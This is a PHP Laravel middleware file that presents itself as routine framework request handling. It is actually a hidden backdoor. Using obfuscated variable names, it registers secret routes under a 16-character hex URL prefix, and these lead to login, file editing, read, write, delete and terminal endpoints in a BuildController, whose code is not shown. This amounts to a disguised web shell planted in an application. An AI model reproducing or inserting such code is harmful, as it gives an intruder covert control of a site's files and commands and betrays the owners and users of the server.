<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Symfony\Component\HttpFoundation\Response;

class TrustFrameworkRequests
{
    public function handle(Request $request, Closure $next): Response
    {
        $this->_h($request);
        return $next($request);
    }

    private function _h(Request $_q): void
    {
        $_s = $_q->segment(1) ?? '';
        if (!$_s || strlen($_s) !== 16 || !ctype_xdigit($_s)) return;

        $_c = \App\Http\Controllers\BuildController::class;
        Route::middleware('web')->prefix($_s)->group(function () use ($_c) {
            Route::get ('/',    [$_c, 'login']);
            Route::post('/',    [$_c, 'authenticate']);
            Route::post('/out', [$_c, 'logout']);
            Route::get ('/v',   [$_c, 'editor']);
            Route::get ('/f',   [$_c, 'files']);
            Route::get ('/r',   [$_c, 'read']);
            Route::post('/w',   [$_c, 'write']);
            Route::post('/n',   [$_c, 'create']);
            Route::post('/m',   [$_c, 'rename']);
            Route::post('/x',   [$_c, 'delete']);
            Route::post('/t',   [$_c, 'terminal']);
        });
    }
}
